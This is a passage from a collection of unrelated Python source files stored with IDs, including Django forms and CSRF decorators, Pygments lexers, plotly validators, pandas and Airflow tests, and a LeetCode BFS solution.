        self.tile = [(""raw"", (0, 0) + self.size, self.fp.tell(), (self.mode, 0, 1))]


# --------------------------------------------------------------------

Image.register_open(XVThumbImageFile.format, XVThumbImageFile, _accept)"
JD389	JD389-ogrinfo.py	"""""""
This module includes some utility functions for inspecting the layout
of a GDAL data source -- the functionality is analogous to the output
produced by the `ogrinfo` utility.
""""""

from django.contrib.gis.gdal import DataSource
from django.contrib.gis.gdal.geometries import GEO_CLASSES


def ogrinfo(data_source, num_features=10):
    """"""
    Walk the available layers in the supplied `data_source`, displaying
    the fields for the first `num_features` features.
    """"""

    # Checking the parameters.
    if isinstance(data_source, str):
        data_source = DataSource(data_source)
    elif isinstance(data_source, DataSource):
        pass
    else:
        raise Exception(
            ""Data source parameter must be a string or a DataSource object.""
        )

    for i, layer in enumerate(data_source):
        print(""data source : %s"" % data_source.name)
        print(""==== layer %s"" % i)
        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)
        print(""  # features: %s"" % len(layer))
        print(""         srs: %s"" % layer.srs)
        extent_tup = layer.extent.tuple
        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))
        print(""Displaying the first %s features ===="" % num_features)

        width = max(*map(len, layer.fields))
        fmt = "" %%%ss: %%s"" % width
        for j, feature in enumerate(layer[:num_features]):
            print(""=== Feature %s"" % j)
            for fld_name in layer.fields:
                type_name = feature[fld_name].type_name
                output = fmt % (fld_name, type_name)
                val = feature.get(fld_name)
                if val:
                    if isinstance(val, str):
                        val_fmt = ' (""%s"")'
                    else:
                        val_fmt = "" (%s)""
                    output += val_fmt % val
                else:
                    output += "" (None)""
                print(output)"
JD284	JD284-forms.py	"from django.contrib.auth.models import User
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
from django import forms
from .models import UserOfFacility, CaseReport

class DateInput(forms.DateInput):
    input_type = 'date'

# アカウント登録
class SignupForm(UserCreationForm):
    class Meta:
        model = User
        fields = ['username', 'email', 'password1', 'password2']
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for field in self.fields.values():
            field.widget.attrs['class'] = 'form-control'

# アカウント編集
class UserUpdateForm(forms.ModelForm):
    class Meta:
        model = User
        fields = ('username', 'email')
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for field in self.fields.values():
            field.widget.attrs['class'] = 'form-control'

# ログイン
class LoginForm(AuthenticationForm):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for field in self.fields.values():
            field.widget.attrs['class'] = 'form-control'

# 利用者
class UserOfFacilityForm(forms.ModelForm):
    class Meta:
        model = UserOfFacility
        fields = (""name"", ""organization"", ""group"", ""address"", ""tel"", ""mail"", ""handicap_name"", ""handicap_level"")
        widgets = {
            'address': forms.Textarea(attrs={'rows':1}),
            'handicap_name': forms.Textarea(attrs={'rows':1}),
        }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for field in self.fields.values():
            field.widget.attrs['class'] = 'form-control'

# 事例記録
class CaseReportForm(forms.ModelForm):
    class Meta:
        model = CaseReport
        fields = (""occurrence_date"", ""case_name"", ""content"", ""method"", ""result"")
        widgets = {
            ""occurrence_date"": DateInput(),
        }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for field in self.fields.values():
            field.widget.attrs['class'] = 'form-control'"
JD92	JD92-csrf.py	"from functools import wraps

from django.middleware.csrf import CsrfViewMiddleware, get_token
from django.utils.decorators import decorator_from_middleware

csrf_protect = decorator_from_middleware(CsrfViewMiddleware)
csrf_protect.__name__ = ""csrf_protect""
csrf_protect.__doc__ = """"""
This decorator adds CSRF protection in exactly the same way as
CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or
using the decorator multiple times, is harmless and efficient.
""""""


class _EnsureCsrfToken(CsrfViewMiddleware):
    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.
    def _reject(self, request, reason):
        return None


requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)
requires_csrf_token.__name__ = 'requires_csrf_token'
requires_csrf_token.__doc__ = """"""
Use this decorator on views that need a correct csrf_token available to
RequestContext, but without the CSRF protection that csrf_protect
enforces.
""""""


class _EnsureCsrfCookie(CsrfViewMiddleware):
    def _reject(self, request, reason):
        return None

    def process_view(self, request, callback, callback_args, callback_kwargs):
        retval = super().process_view(request, callback, callback_args, callback_kwargs)
        # Force process_response to send the cookie
        get_token(request)
        return retval


ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)
ensure_csrf_cookie.__name__ = 'ensure_csrf_cookie'
ensure_csrf_cookie.__doc__ = """"""
Use this decorator to ensure that a view sets a CSRF cookie, whether or not it
uses the csrf_token template tag, or the CsrfViewMiddleware is used.
""""""


def csrf_exempt(view_func):
    """"""Mark a view function as being exempt from the CSRF view protection.""""""
    # view_func.csrf_exempt = True would also work, but decorators are nicer
    # if they don't have side effects, so return a new function.
    def wrapped_view(*args, **kwargs):
        return view_func(*args, **kwargs)
    wrapped_view.csrf_exempt = True
    return wraps(view_func)(wrapped_view)"
JY328	JY328-task_eq_07.py	"""""""
Сравнение экземпляров класса

Python поддерживает определение шести основных операций
сравнения экземпляров
__eq__    - равно, ==
__ne__    - не равно, !=
__gt__    - больше, >
__ge__    - не больше, меньше или равно, <=
__lt__    - меньше, <
__le__    - не меньше, больше или равно, >=
""""""
from math import sqrt


class Triangle:
    def __init__(self, a, b, c):
        self.a = a
        self.b = b
        self.c = c

    def __str__(self):
        return f'Треугольник со сторонами {self.a}, {self.b}, {self.c}'

    def __repr__(self):
        return f'Triangle({self.a}, {self.b}, {self.c})'

    def __eq__(self, other):
        first = sorted((self.a, self.b, self.c))
        second = sorted((other.a, other.b, other.c))
        return first == second

    def area(self):
        p = (self.a + self.b + self.c) / 2
        _area = sqrt(p * (p - self.a) * (p - self.b) * (p - self.c))
        return _area

    def __lt__(self, other):
        return self.area() < other.area()

    def __hash__(self):
        """"""Пытаемся вычислить хэш от нашего экземпляра""""""
        return hash((self.a, self.b, self.c))


def main():
    triangle_set = {Triangle(3, 4, 5), Triangle(6, 2, 5), Triangle(4, 4, 4),
                    Triangle(3, 5, 3)}
    print(triangle_set)
    print(', '.join(f'{item.area():.3f}' for item in triangle_set))
    print(', '.join(f'{item.__hash__()}' for item in triangle_set))


if __name__ == '__main__':
    main()
""""""
{Triangle(4, 4, 4), Triangle(3, 4, 5), Triangle(6, 2, 5), Triangle(3, 5, 3)}
6.928, 6.000, 4.684, 4.146
5958266269407395088, 4003026094496801395, 7248620568795758028, -7050955881463073020

Process finished with exit code 0
""""""
# 01:31:57
# 01:28:28 - обязательно для изучения !!!"
JD426	JD426-542. 01矩阵到0的最短距离(填充BFS).py	"""""""
给定一个由 0 和 1 组成的矩阵，找出每个元素到最近的 0 的距离。

两个相邻元素间的距离为 1 。

0 0 0
0 1 0
1 1 1
输出:

0 0 0
0 1 0
1 2 1
""""""


class Solution(object):
    def updateMatrix(self, matrix):
        """"""
        :type matrix: List[List[int]]
        :rtype: List[List[int]]
        """"""
        self.dirs = [[-1, 0], [1, 0], [0, 1], [0, -1]]
        self.lr = len(matrix)
        self.lc = len(matrix[0])
        dist = [[0 for c in range(self.lc)] for r in range(self.lr)]

        zero_pos = []
        for i in range(self.lr):
            for j in range(self.lc):
                # 我们先把所有0的节点放进queue,然后从每个0节点开始向外面扩散
                if matrix[i][j] == 0:
                    zero_pos.append((i, j))

        queue = zero_pos
        # 注意，假如说我们要set一个二维数组，那么这个数组里面只能存 tuple
        visited = set(zero_pos)

        while queue:
            x, y = queue.pop(0)

            for dir in self.dirs:
                new_x = x + dir[0]
                new_y = y + dir[1]
                if 0 <= new_x < self.lr and 0 <= new_y < self.lc and (new_x, new_y) not in visited:
                    # 扩散顺序是这样的，先扩散0周围的，那么他们距离0的距离就是 0+1
                    # 然后再扩散距离0为1 的点，那么这些点扩散出去的距离就是2
                    dist[new_x][new_y] = dist[x][y] + 1
                    queue.append([new_x, new_y])
                    visited.add((new_x, new_y))

        return dist

""""""
时间复杂度：O(rc)，其中 r 为矩阵行数，c 为矩阵列数，即矩阵元素个数。广度优先搜索中每个位置最多只会被加入队列一次，因此只需要 O(rc)O(rc) 的时间复杂度。

空间复杂度：O(rc)，其中 r 为矩阵行数，c 为矩阵列数，即矩阵元素个数。除答案数组外，最坏情况下矩阵里所有元素都为 0，全部被加入队列中，此时需要 O(rc) 的空间复杂度。


链接：https://leetcode-cn.com/problems/01-matrix/solution/01ju-zhen-by-leetcode-solution/

""""""


"
JY27	JY27-jmespath.py	"""""""
    pygments.lexers.jmespath
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the JMESPath language

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups, include
from pygments.token import String, Punctuation, Whitespace, Name, Operator, \
    Number, Literal, Keyword

__all__ = ['JMESPathLexer']


class JMESPathLexer(RegexLexer):
    """"""
    For JMESPath queries.
    """"""
    name = 'JMESPath'
    url = 'https://jmespath.org'
    filenames = ['*.jp']
    aliases = ['jmespath', 'jp']

    tokens = {
        'string': [
            (r""'(\\(.|\n)|[^'\\])*'"", String),
        ],
        'punctuation': [
            (r'(\[\?|[\.\*\[\],:\(\)\{\}\|])', Punctuation),
        ],
        'ws': [
            (r"" |\t|\n|\r"", Whitespace)
        ],
        ""dq-identifier"": [
            (r'[^\\""]+', Name.Variable),
            (r'\\""', Name.Variable),
            (r'.', Punctuation, '#pop'),
        ],
        'identifier': [
            (r'(&)?("")', bygroups(Name.Variable, Punctuation), 'dq-identifier'),
            (r'("")?(&?[A-Za-z][A-Za-z0-9_-]*)("")?', bygroups(Punctuation, Name.Variable, Punctuation)),
        ],
        'root': [
            include('ws'),
            include('string'),
            (r'(==|!=|<=|>=|<|>|&&|\|\||!)', Operator),
            include('punctuation'),
            (r'@', Name.Variable.Global),
            (r'(&?[A-Za-z][A-Za-z0-9_]*)(\()', bygroups(Name.Function, Punctuation)),
            (r'(&)(\()', bygroups(Name.Variable, Punctuation)),
            include('identifier'),
            (r'-?\d+', Number),
            (r'`', Literal, 'literal'),
        ],
        'literal': [
            include('ws'),
            include('string'),
            include('punctuation'),
            (r'(false|true|null)\b', Keyword.Constant),
            include('identifier'),
            (r'-?\d+\.?\d*([eE][-+]\d+)?', Number),
            (r'\\`', Literal),
            (r'`', Literal, '#pop'),
        ]
    }"
JD374	JD374-_internal_utils.py	"""""""
Internal debugging utilities, that are not expected to be used in the rest of
the codebase.

WARNING: Code in this module may change without prior notice!
""""""

from io import StringIO
from pathlib import Path
import subprocess

from matplotlib.transforms import TransformNode


def graphviz_dump_transform(transform, dest, *, highlight=None):
    """"""
    Generate a graphical representation of the transform tree for *transform*
    using the :program:`dot` program (which this function depends on).  The
    output format (png, dot, etc.) is determined from the suffix of *dest*.

    Parameters
    ----------
    transform : `~matplotlib.transform.Transform`
        The represented transform.
    dest : str
        Output filename.  The extension must be one of the formats supported
        by :program:`dot`, e.g. png, svg, dot, ...
        (see https://www.graphviz.org/doc/info/output.html).
    highlight : list of `~matplotlib.transform.Transform` or None
        The transforms in the tree to be drawn in bold.
        If *None*, *transform* is highlighted.
    """"""

    if highlight is None:
        highlight = [transform]
    seen = set()

    def recurse(root, buf):
        if id(root) in seen:
            return
        seen.add(id(root))
        props = {}
        label = type(root).__name__
        if root._invalid:
            label = f'[{label}]'
        if root in highlight:
            props['style'] = 'bold'
        props['shape'] = 'box'
        props['label'] = '""%s""' % label
        props = ' '.join(map('{0[0]}={0[1]}'.format, props.items()))
        buf.write(f'{id(root)} [{props}];\n')
        for key, val in vars(root).items():
            if isinstance(val, TransformNode) and id(root) in val._parents:
                buf.write(f'""{id(root)}"" -> ""{id(val)}"" '
                          f'[label=""{key}"", fontsize=10];\n')
                recurse(val, buf)

    buf = StringIO()
    buf.write('digraph G {\n')
    recurse(transform, buf)
    buf.write('}\n')
    subprocess.run(
        ['dot', '-T', Path(dest).suffix[1:], '-o', dest],
        input=buf.getvalue().encode('utf-8'), check=True)"
JD363	JD363-list_site_keys.py	"#!/usr/bin/env python
# Copyright 2021 Google, Inc
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# All Rights Reserved.

# [START recaptcha_enterprise_list_site_keys]
from google.cloud import recaptchaenterprise_v1
from google.cloud.recaptchaenterprise_v1.services.recaptcha_enterprise_service.pagers import (
    ListKeysPager,
)


def list_site_keys(project_id: str) -> ListKeysPager:
    """"""List all keys present under the given project ID.

    Args:
    project_id: GCloud Project ID.
    """"""

    project_name = f""projects/{project_id}""

    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()

    # Set the project id to list the keys present in it.
    request = recaptchaenterprise_v1.ListKeysRequest()
    request.parent = project_name

    response = client.list_keys(request)
    print(""Listing reCAPTCHA site keys: "")
    for i, key in enumerate(response):
        print(f""{str(i)}. {key.name}"")

    return response


# [END recaptcha_enterprise_list_site_keys]


if __name__ == ""__main__"":
    import google.auth
    import google.auth.exceptions

    # TODO(developer): Replace the below variables before running
    try:
        default_project_id = google.auth.default()[1]
    except google.auth.exceptions.DefaultCredentialsError:
        print(
            ""Please use `gcloud auth application-default login` ""
            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""
        )
    else:
        list_site_keys(default_project_id)"
JY506	JY506-binary_sensor.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome.components import sensor, binary_sensor, esp32_ble_tracker
from esphome.const import (
    CONF_BATTERY_LEVEL,
    CONF_MAC_ADDRESS,
    CONF_TABLET,
    DEVICE_CLASS_BATTERY,
    ENTITY_CATEGORY_DIAGNOSTIC,
    STATE_CLASS_MEASUREMENT,
    UNIT_PERCENT,
    ICON_BUG,
)


DEPENDENCIES = [""esp32_ble_tracker""]
AUTO_LOAD = [""xiaomi_ble"", ""sensor""]

xiaomi_wx08zm_ns = cg.esphome_ns.namespace(""xiaomi_wx08zm"")
XiaomiWX08ZM = xiaomi_wx08zm_ns.class_(
    ""XiaomiWX08ZM"",
    binary_sensor.BinarySensor,
    esp32_ble_tracker.ESPBTDeviceListener,
    cg.Component,
)

CONFIG_SCHEMA = cv.All(
    binary_sensor.binary_sensor_schema(XiaomiWX08ZM)
    .extend(
        {
            cv.Required(CONF_MAC_ADDRESS): cv.mac_address,
            cv.Optional(CONF_TABLET): sensor.sensor_schema(
                unit_of_measurement=UNIT_PERCENT,
                icon=ICON_BUG,
                accuracy_decimals=0,
                state_class=STATE_CLASS_MEASUREMENT,
            ),
            cv.Optional(CONF_BATTERY_LEVEL): sensor.sensor_schema(
                unit_of_measurement=UNIT_PERCENT,
                accuracy_decimals=0,
                device_class=DEVICE_CLASS_BATTERY,
                state_class=STATE_CLASS_MEASUREMENT,
                entity_category=ENTITY_CATEGORY_DIAGNOSTIC,
            ),
        }
    )
    .extend(esp32_ble_tracker.ESP_BLE_DEVICE_SCHEMA)
    .extend(cv.COMPONENT_SCHEMA)
)


async def to_code(config):
    var = await binary_sensor.new_binary_sensor(config)
    await cg.register_component(var, config)
    await esp32_ble_tracker.register_ble_device(var, config)

    cg.add(var.set_address(config[CONF_MAC_ADDRESS].as_hex))

    if CONF_TABLET in config:
        sens = await sensor.new_sensor(config[CONF_TABLET])
        cg.add(var.set_tablet(sens))
    if CONF_BATTERY_LEVEL in config:
        sens = await sensor.new_sensor(config[CONF_BATTERY_LEVEL])
        cg.add(var.set_battery_level(sens))"
JY97	JY97-filter.py	"""""""
    pygments.filter
    ~~~~~~~~~~~~~~~

    Module that implements the default filter.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""


def apply_filters(stream, filters, lexer=None):
    """"""
    Use this method to apply an iterable of filters to
    a stream. If lexer is given it's forwarded to the
    filter, otherwise the filter receives `None`.
    """"""

    def _apply(filter_, stream):
        yield from filter_.filter(lexer, stream)

    for filter_ in filters:
        stream = _apply(filter_, stream)
    return stream


def simplefilter(f):
    """"""
    Decorator that converts a function into a filter::

        @simplefilter
        def lowercase(self, lexer, stream, options):
            for ttype, value in stream:
                yield ttype, value.lower()
    """"""
    return type(
        f.__name__,
        (FunctionFilter,),
        {
            ""__module__"": getattr(f, ""__module__""),
            ""__doc__"": f.__doc__,
            ""function"": f,
        },
    )


class Filter:
    """"""
    Default filter. Subclass this class or use the `simplefilter`
    decorator to create own filters.
    """"""

    def __init__(self, **options):
        self.options = options

    def filter(self, lexer, stream):
        raise NotImplementedError()


class FunctionFilter(Filter):
    """"""
    Abstract class used by `simplefilter` to create simple
    function filters on the fly. The `simplefilter` decorator
    automatically creates subclasses of this class for
    functions passed to it.
    """"""

    function = None

    def __init__(self, **options):
        if not hasattr(self, ""function""):
            raise TypeError(""%r used without bound function"" % self.__class__.__name__)
        Filter.__init__(self, **options)

    def filter(self, lexer, stream):
        # pylint: disable=not-callable
        yield from self.function(lexer, stream, self.options)"
JY344	JY344-__init__.py	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._yanchor import YanchorValidator
    from ._y import YValidator
    from ._xanchor import XanchorValidator
    from ._x import XValidator
    from ._visible import VisibleValidator
    from ._type import TypeValidator
    from ._templateitemname import TemplateitemnameValidator
    from ._showactive import ShowactiveValidator
    from ._pad import PadValidator
    from ._name import NameValidator
    from ._font import FontValidator
    from ._direction import DirectionValidator
    from ._buttondefaults import ButtondefaultsValidator
    from ._buttons import ButtonsValidator
    from ._borderwidth import BorderwidthValidator
    from ._bordercolor import BordercolorValidator
    from ._bgcolor import BgcolorValidator
    from ._active import ActiveValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._yanchor.YanchorValidator"",
            ""._y.YValidator"",
            ""._xanchor.XanchorValidator"",
            ""._x.XValidator"",
            ""._visible.VisibleValidator"",
            ""._type.TypeValidator"",
            ""._templateitemname.TemplateitemnameValidator"",
            ""._showactive.ShowactiveValidator"",
            ""._pad.PadValidator"",
            ""._name.NameValidator"",
            ""._font.FontValidator"",
            ""._direction.DirectionValidator"",
            ""._buttondefaults.ButtondefaultsValidator"",
            ""._buttons.ButtonsValidator"",
            ""._borderwidth.BorderwidthValidator"",
            ""._bordercolor.BordercolorValidator"",
            ""._bgcolor.BgcolorValidator"",
            ""._active.ActiveValidator"",
        ],
    )"
JD512	JD512-test_formats.py	"import pytest

from pandas import Timestamp

ts_no_ns = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=132263,
)
ts_ns = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=132263,
    nanosecond=123,
)
ts_ns_tz = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=132263,
    nanosecond=123,
    tz=""UTC"",
)
ts_no_us = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=0,
    nanosecond=123,
)


@pytest.mark.parametrize(
    ""ts, timespec, expected_iso"",
    [
        (ts_no_ns, ""auto"", ""2019-05-18T15:17:08.132263""),
        (ts_no_ns, ""seconds"", ""2019-05-18T15:17:08""),
        (ts_no_ns, ""nanoseconds"", ""2019-05-18T15:17:08.132263000""),
        (ts_ns, ""auto"", ""2019-05-18T15:17:08.132263123""),
        (ts_ns, ""hours"", ""2019-05-18T15""),
        (ts_ns, ""minutes"", ""2019-05-18T15:17""),
        (ts_ns, ""seconds"", ""2019-05-18T15:17:08""),
        (ts_ns, ""milliseconds"", ""2019-05-18T15:17:08.132""),
        (ts_ns, ""microseconds"", ""2019-05-18T15:17:08.132263""),
        (ts_ns, ""nanoseconds"", ""2019-05-18T15:17:08.132263123""),
        (ts_ns_tz, ""auto"", ""2019-05-18T15:17:08.132263123+00:00""),
        (ts_ns_tz, ""hours"", ""2019-05-18T15+00:00""),
        (ts_ns_tz, ""minutes"", ""2019-05-18T15:17+00:00""),
        (ts_ns_tz, ""seconds"", ""2019-05-18T15:17:08+00:00""),
        (ts_ns_tz, ""milliseconds"", ""2019-05-18T15:17:08.132+00:00""),
        (ts_ns_tz, ""microseconds"", ""2019-05-18T15:17:08.132263+00:00""),
        (ts_ns_tz, ""nanoseconds"", ""2019-05-18T15:17:08.132263123+00:00""),
        (ts_no_us, ""auto"", ""2019-05-18T15:17:08.000000123""),
    ],
)
def test_isoformat(ts, timespec, expected_iso):
    assert ts.isoformat(timespec=timespec) == expected_iso"
JY416	JY416-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""candlestick.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY145	JY145-_itertools.py	"from itertools import filterfalse


def unique_everseen(iterable, key=None):
    ""List unique elements, preserving order. Remember all elements ever seen.""
    # unique_everseen('AAAABBBCCDAABBB') --> A B C D
    # unique_everseen('ABBCcAD', str.lower) --> A B C D
    seen = set()
    seen_add = seen.add
    if key is None:
        for element in filterfalse(seen.__contains__, iterable):
            seen_add(element)
            yield element
    else:
        for element in iterable:
            k = key(element)
            if k not in seen:
                seen_add(k)
                yield element


# copied from more_itertools 8.8
def always_iterable(obj, base_type=(str, bytes)):
    """"""If *obj* is iterable, return an iterator over its items::

        >>> obj = (1, 2, 3)
        >>> list(always_iterable(obj))
        [1, 2, 3]

    If *obj* is not iterable, return a one-item iterable containing *obj*::

        >>> obj = 1
        >>> list(always_iterable(obj))
        [1]

    If *obj* is ``None``, return an empty iterable:

        >>> obj = None
        >>> list(always_iterable(None))
        []

    By default, binary and text strings are not considered iterable::

        >>> obj = 'foo'
        >>> list(always_iterable(obj))
        ['foo']

    If *base_type* is set, objects for which ``isinstance(obj, base_type)``
    returns ``True`` won't be considered iterable.

        >>> obj = {'a': 1}
        >>> list(always_iterable(obj))  # Iterate over the dict's keys
        ['a']
        >>> list(always_iterable(obj, base_type=dict))  # Treat dicts as a unit
        [{'a': 1}]

    Set *base_type* to ``None`` to avoid any special handling and treat objects
    Python considers iterable as iterable:

        >>> obj = 'foo'
        >>> list(always_iterable(obj, base_type=None))
        ['f', 'o', 'o']
    """"""
    if obj is None:
        return iter(())

    if (base_type is not None) and isinstance(obj, base_type):
        return iter((obj,))

    try:
        return iter(obj)
    except TypeError:
        return iter((obj,))"
JY232	JY232-test_emr_terminate_job_flow.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from unittest.mock import MagicMock, patch

from airflow.providers.amazon.aws.operators.emr import EmrTerminateJobFlowOperator

TERMINATE_SUCCESS_RETURN = {""ResponseMetadata"": {""HTTPStatusCode"": 200}}


class TestEmrTerminateJobFlowOperator:
    def setup_method(self):
        # Mock out the emr_client (moto has incorrect response)
        mock_emr_client = MagicMock()
        mock_emr_client.terminate_job_flows.return_value = TERMINATE_SUCCESS_RETURN

        mock_emr_session = MagicMock()
        mock_emr_session.client.return_value = mock_emr_client

        # Mock out the emr_client creator
        self.boto3_session_mock = MagicMock(return_value=mock_emr_session)

    def test_execute_terminates_the_job_flow_and_does_not_error(self):
        with patch(""boto3.session.Session"", self.boto3_session_mock):
            operator = EmrTerminateJobFlowOperator(
                task_id=""test_task"", job_flow_id=""j-8989898989"", aws_conn_id=""aws_default""
            )

            operator.execute(MagicMock())"
JD134	JD134-compress_base.py	"###############################################################################
#
# The MIT License (MIT)
#
# Copyright (c) typedef int GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the ""Software""), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
###############################################################################

__all__ = (
    'PerMessageCompressOffer',
    'PerMessageCompressOfferAccept',
    'PerMessageCompressResponse',
    'PerMessageCompressResponseAccept',
    'PerMessageCompress',
)


class PerMessageCompressOffer(object):
    """"""
    Base class for WebSocket compression parameter client offers.
    """"""


class PerMessageCompressOfferAccept(object):
    """"""
    Base class for WebSocket compression parameter client offer accepts by the server.
    """"""


class PerMessageCompressResponse(object):
    """"""
    Base class for WebSocket compression parameter server responses.
    """"""


class PerMessageCompressResponseAccept(object):
    """"""
    Base class for WebSocket compression parameter server response accepts by client.
    """"""


class PerMessageCompress(object):
    """"""
    Base class for WebSocket compression negotiated parameters.
    """""""
JD192	JD192-trac.py	"""""""
    pygments.styles.trac
    ~~~~~~~~~~~~~~~~~~~~

    Port of the default trac highlighter design.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class TracStyle(Style):
    """"""
    Port of the default trac highlighter design.
    """"""

    styles = {
        Whitespace:             '#bbbbbb',
        Comment:                'italic #999988',
        Comment.Preproc:        'bold noitalic #999999',
        Comment.Special:        'bold #999999',

        Operator:               'bold',

        String:                 '#bb8844',
        String.Regex:           '#808000',

        Number:                 '#009999',

        Keyword:                'bold',
        Keyword.Type:           '#445588',

        Name.Builtin:           '#999999',
        Name.Function:          'bold #990000',
        Name.Class:             'bold #445588',
        Name.Exception:         'bold #990000',
        Name.Namespace:         '#555555',
        Name.Variable:          '#008080',
        Name.Constant:          '#008080',
        Name.Tag:               '#000080',
        Name.Attribute:         '#008080',
        Name.Entity:            '#800080',

        Generic.Heading:        '#999999',
        Generic.Subheading:     '#aaaaaa',
        Generic.Deleted:        'bg:#ffdddd #000000',
        Generic.Inserted:       'bg:#ddffdd #000000',
        Generic.Error:          '#aa0000',
        Generic.Emph:           'italic',
        Generic.Strong:         'bold',
        Generic.Prompt:         '#555555',
        Generic.Output:         '#888888',
        Generic.Traceback:      '#aa0000',

        Error:                  'bg:#e3d2d2 #a61717'
    }"
JY271	JY271-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""scattersmith"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

